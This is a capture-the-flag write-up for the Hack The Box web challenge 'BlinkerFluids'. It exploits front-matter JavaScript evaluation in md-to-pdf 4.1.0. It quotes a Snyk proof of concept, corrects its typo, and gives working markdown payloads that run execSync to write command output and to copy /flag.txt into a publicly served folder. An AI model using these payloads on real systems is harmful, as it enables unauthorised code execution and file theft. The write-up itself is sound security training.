# BlinkerFluids WriteUp
### Solved by e-seng (Petiole)

## Problem
### Description
```
Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him?
```
### Challenge files
[web\_blinkerfluids.zip](./web_blinkerfluids.zip), which expands in
```
web_blinkerfluids
├── build-docker.sh
├── challenge
│   ├── database.js
│   ├── helpers
│   │   └── MDHelper.js
│   ├── index.js
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── css
│   │   │   ├── bootstrap.min.css
│   │   │   ├── easymde.min.css
│   │   │   └── main.css
│   │   ├── images
│   │   │   └── favicon.png
│   │   ├── invoices
│   │   │   └── f0daa85f-b9de-4b78-beff-2f86e242d6ac.pdf
│   │   └── js
│   │       ├── easymde.min.js
│   │       ├── jquery-3.6.0.min.js
│   │       └── main.js
│   └── views
│       └── index.html
├── config
│   └── supervisord.conf
├── Dockerfile
└── flag.txt
```
where the provided `flag.txt` had the text `HTB{f4k3_fl4g_f0r_t3st1ng}`

### Website Description
the provided websites allowed for the creation and storage of invoices, stored
within `pdf` files on the server. these files are generated from input following
Markdown syntax. this input may be entered within the website itself by any user

## Solving Process
### Initial Analysis
seeing the flag is stored within its own file, `flag.txt`, it was likely that
i needed to somehow read the file, and return its contents to the client. my
initial thought was possibly exploiting some local file inclusion (LFI) within
the code. examination of the provided Dockerfile showed that the flag was stored
at `/flag.txt`.

```Dockerfile
    --no-install-recommends \
    && rm -rf /var/lib/apt/lists/*

# Setup challenge directory
RUN mkdir -p /app

# Add flag
COPY flag.txt /flag.txt

# Add application
WORKDIR /app
COPY challenge .
RUN chown -R www-data:www-data .
```
*note: this code snippet and all future code snippets will only show important
sections of code and surrounding context.*

> my thought process behind using an LFI exploit was led on by the fact that the
server is able to read local `pdf` documents after they have been generated.
> possibly, if the server is reading some select `pdf` file specified by the
user, then it may be possible to redirect the path to a file we would like to
actually read, `/flag.txt` in this case.

despite this initial thought, nowhere in the code indicated a method that would
read arbitrary files. the closest possibility to that was within
`web_blinkerfluids/challenge/index.js`, where the express app contains a path to
static files.

```js
	autoescape: true,
	express: app
});

app.set('views', './views');
app.use('/static', express.static(path.resolve('static')));

app.use(routes(db));

app.all('*', (req, res) => {
```

seeing this, there could be some potential way that `express`, the nodejs module
itself could be vulnerable.

during this time, i also noticed `web_blinkerfluids/challenge/helpers/MDHelper.js`,
which seems to be a general wrapper function for `mdToPdf`, which was another
nodejs module to my surprise. unfortunately, no LFI vulnerabilities could be
found here, as this simply generated `pdf` files from the markdown input.

> semi-irrelevant, but i also noticed that SQL was being used for the database,
and that the webserver used the `sqlite-async` nodejs module. this was
semi-concerning for me, because i'm terrible at SQL injections, but upon closer
inspection, SQL injections did not seem feasible as all SQL queries used `?`
placeholders. still unfortunate that it's not a reasonable attack vector.

seeing that the code itself was unlikely vulnerable own its own, i started to
look into the dependencies of the web application. i noted `express` being a
good, potential vulnerable dependency, and this application uses `express 4.17.3`
as stated within `web_blinkerfluids/challenge/package.json`
```json
	"keywords": [],
	"author": "rayhan0x01",
	"license": "ISC",
	"dependencies": {
		"express": "4.17.3",
		"md-to-pdf": "4.1.0",
		"nunjucks": "3.2.3",
		"sqlite-async": "1.1.3",
		"uuid": "8.3.2"
	},
	"devDependencies": {
		"nodemon": "^1.19.1"
	}
```

a quick duckduckgo search into *express 4.17.3 LFI exploits* yielded... very
little. it was vulnerable to remote code execution, however, that vulnerability
was not relevant to this machine. the necessary function that was vulnerable was
not being called within the code outside `jquery.js`, which would be only used
by the client regardless.

the next block on the cutting board would be other potentially vulnerable modules.
`md-to-pdf` was next on the list, so i figured i would look into that one next.
it did involve *some* file manipulation, so maybe there was something i could use.

a duckduckgo search into `nodejs md-to-pdf 4.1.0 exploits lfi` yielded [this
sync.io page](https://snyk.io/test/npm/md-to-pdf/4.1.0). although no issues
reported any LFI exploits as i originally thought it might, *critical severity:
Remote Code Execution (RCE)* was in red. perfect.

### developing the exploit
the issue of note stated the following:

> md-to-pdf is a CLI tool for converting Markdown files to PDF.
> 
> Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to utilizing the library gray-matter to parse front matter content, without disabling the JS engine.
> 
> ##PoC:
> ```
> $ cat /tmp/RCE.txt
> cat: /tmp/RCE.txt: No such file or directory
> 
> $ node poc.js
> 
> $ cat /tmp/RCE.txt
> uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
> ```
>
> Exploit code poc.js:
> ```js
> const { mdToPdf } = require('md-to-pdf');
> 
> var payload = '---jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))n---RCE';
> 
> (async () => {
> await mdToPdf({ content: payload }, { dest: './output.pdf' });
> })();
> ```

a provided proof of concept of the exploit?? and it is only one line??? wow.
that is super nice

> well, it was semi-nice. sure, it probably works, but what on earth is the `jsn`
function? maybe it's something that is only interpreted by mdToPdf? no idea.

copying `---jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))n---RCE`
into the markdown input yielded with an error. cool, but it was unclear whether
this exploit actually worked.

> *ah, if only there was a way for me to check whether the result of the payload*
i thought to myself. *wouldn't that be nice*.

> of course: i had the source code, and also a nice script to help me build the
docker container! amazing

as such, i installed docker onto my kali vm and built the docker image (which
took *super* long).

once built, the server ran automatically on `localhost:1337`, and i could view
the logs the container was generating, including any errors! nice.

throwing `---jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))n---RCE`
at the machine as input yielded with the following stack trace:
```
Error: gray-matter engine "jsn((require("child_process")).execSync("id > /tmp/test.txt"))n---RC" is not registered
    at module.exports (/app/node_modules/gray-matter/lib/engine.js:6:11)
    at module.exports (/app/node_modules/gray-matter/lib/parse.js:8:18)
    at parseMatter (/app/node_modules/gray-matter/index.js:109:17)
    at Object.matter [as default] (/app/node_modules/gray-matter/index.js:50:10)
    at Object.convertMdToPdf (/app/node_modules/md-to-pdf/dist/lib/md-to-pdf.js:23:75)
    at mdToPdf (/app/node_modules/md-to-pdf/dist/index.js:30:35)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async /app/helpers/MDHelper.js:8:13
```

... interesting, i've never heard of the `gray-matter engine`, but there exist
a *whole* bunch of nodejs modules. i tried to perform some research on
`gray-matter`, but came short with any results, let alone any method to resolve
this issue. (perhaps it was because i searched for `grey-matter engine`?) idk

after some time, i looked back at the stack trace and noticed that the lowest
error was being thrown within `/app/node_modules/gray-matter/lib/engine.js:6:11`.
it might be possible for me to take a look at that module and determine its issue?
my main concern would be that this was a potential rabbit hole, as if there was
an issue with the `gray-matter` module, i would not be able to fix it on the
running machine. regardless i took a look at it, and i'm glad that i did.

hopping into the docker container with `docker exec -it web_blinkerfluids /bin/bash`,
reading the source file yielded the following:
```js
// root@485296829ef8:/app# cat /app/node_modules/gray-matter/lib/engine.js 
'use strict';

module.exports = function(name, options) {
  let engine = options.engines[name] || options.engines[aliase(name)];
  if (typeof engine === 'undefined') {
    throw new Error('gray-matter engine "' + name + '" is not registered');
  }
  if (typeof engine === 'function') {
    engine = { parse: engine };
  }
  return engine;
};

function aliase(name) {
  switch (name.toLowerCase()) {
    case 'js':
    case 'javascript':
      return 'javascript';
    case 'coffee':
    case 'coffeescript':
    case 'cson':
      return 'coffee';
    case 'yaml':
    case 'yml':
      return 'yaml';
    default: {
      return name;
    }
  }
}
```

from the looks of it, it looks like this portion of the code is used to identify
the language of a code segment within a markdown file.

this identification was made intuitively more than anything. i write a lot of
markdown files, like this one, and i'm very familiar with the code-block syntax.
````md
```js  
// this will by written within javascript syntax highlighting
console.log("hello world");
``` 
````

looking at this, everything kinda just clicked. the stack trace above had removed
the preceding `---` for some reason that i was unsure of. if ` ``` ` was equivalent
to `---`, then, to the compiler (parser?), `---jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))n---RCE`
looks like a code block with language `jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))n---RCE`,
which is obviously not on the list. as such, there is actually a typo in the
snyk.io page. the correct payload would actually be:
```js
var payload = '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE';
```
which makes a lot more sense and maybe i should've caught sooner.

now entering the following markdown into the input,
```md
---js
((require("child_process")).execSync("id > /tmp/RCE.txt"))
---RCE
```
produced the following stack trace:
```
SyntaxError: Error: Command failed: id > /tmp/RCE.txt
/bin/sh: 1: cannot create /tmp/RCE.txt: Permission denied
```

nice. we're executing code. idk why `www-data` does not have permission to write
to `/tmp` but that is now not my problem B)

> i feel like i should note that adding any other text, including the base
invoice that pops up when a new invoice is created, into the payload prevents
this exploit from working. not sure why, i find it quite odd to be honest.
though this could be just something that happens on my machine, not sure.

### doing the exploit
up to this point, i have found the following details:

- i can now run arbitrary commands and write their outputs to files where ever
i please
- any file within `/static` is accessible thanks to `express`
- the flag file is within `/flag.txt`
- the process seems to be running in `/app`, as that is the initial directory
when running `docker exec` to interact with the machine.

so, peicing these parts together, i want to read `/flag.txt` and write its output
into the `./static` directory (which would be `/app/static`). then i can read the
output i gathered by connecting to `localhost:1337/static/<filename>`.

this can then be achieved by placing the following text into where the invoice
contents are specified.
```md
---js
((require("child_process")).execSync("cat /flag.txt > static/flag.txt"))
---:)
```

> the additional `:)` will be the only contents shown on the `pdf` generated,
completely useless but idk i think it's fun.

now, connecting to `localhost:1337/static/flag.txt` gives me
`HTB{f4k3_fl4g_f0r_t3st1ng}`, perfect.

the same input can then be used on the "production" server to read the flag file,
and also probably generate a shell or something idrc i got the flag.

## Flag
`HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}`
